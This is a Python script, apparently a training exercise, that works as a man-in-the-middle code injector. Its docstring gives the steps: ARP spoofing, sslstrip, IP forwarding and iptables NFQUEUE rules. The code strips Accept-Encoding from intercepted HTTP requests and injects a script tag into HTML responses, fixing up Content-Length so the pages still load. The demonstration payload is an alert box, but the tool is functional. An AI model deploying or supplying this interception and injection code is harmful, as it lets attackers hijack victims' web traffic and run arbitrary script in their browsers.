#!/usr/bin/env python

'''
    Install netfilterqueue by:
    pip3 install -U git+https://github.com/kti/python-netfilterqueue

    - ARP Spoof against the target
    
    - Run sslstrip 
    
    > echo 1 > /proc/sys/net/ipv4/ip_forward
    
    - run following for https:
    > iptables -I INPUT -j NFQUEUE --queue-num 0
    > iptables -I OUTPUT -j NFQUEUE --queue-num 0

    - run when done:
    iptables --flush
    
'''

# Access the queue by:
import netfilterqueue as nfq
import scapy.all as sp
import re

def modify_load(sp_packet, mod_load):
    sp_packet[sp.Raw].load = mod_load
    del sp_packet[sp.IP].len
    del sp_packet[sp.TCP].chksum
    del sp_packet[sp.IP].chksum
    return sp_packet

def process(packet):
    sp_packet = sp.IP(packet.get_payload())
    if sp_packet.haslayer(sp.Raw):
        if sp_packet.haslayer(sp.TCP):
            load = sp_packet[sp.Raw].load
            if sp_packet[sp.TCP].dport == 10000:
                print("[+] HTTP request : ")
                load = sp_packet[sp.Raw].load.decode("unicode-escape")
                mod_load = re.sub(r'Accept-Encoding:.*', "", load)
                mod_load = mod_load.replace("\n\n", "\n")
                # To make sure the packet isn't segmented
                mod_load = mod_load.replace("HTTP/1.1", "HTTP/1.0")
                mod_load = bytes(mod_load, "utf-8")
                sp_packet = modify_load(sp_packet, mod_load)
                #print(sp_packet.show())
                packet.set_payload(bytes(sp_packet))
            elif sp_packet[sp.TCP].sport == 10000:
                injection = '<script>alert("fool");\r\n</script>'
                print("[+] HTTP response")
                load = sp_packet[sp.Raw].load.decode("utf-8", "backslashreplace")
                load = load.replace("</body>", injection + "</body>")
                content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection)
                    load = load.replace(content_length, str(new_content_length))
                    sp_packet = modify_load(sp_packet, load)
                    packet.set_payload(bytes(sp_packet))
                    print(sp_packet.show())

            '''
            if load != sp_packet[sp.Raw].load:
                sp_packet = modify_load(sp_packet, load)
                packet.set_payload(bytes(sp_packet))
                '''
    packet.accept()


queue = nfq.NetfilterQueue()
queue.bind(0, process)
queue.run()
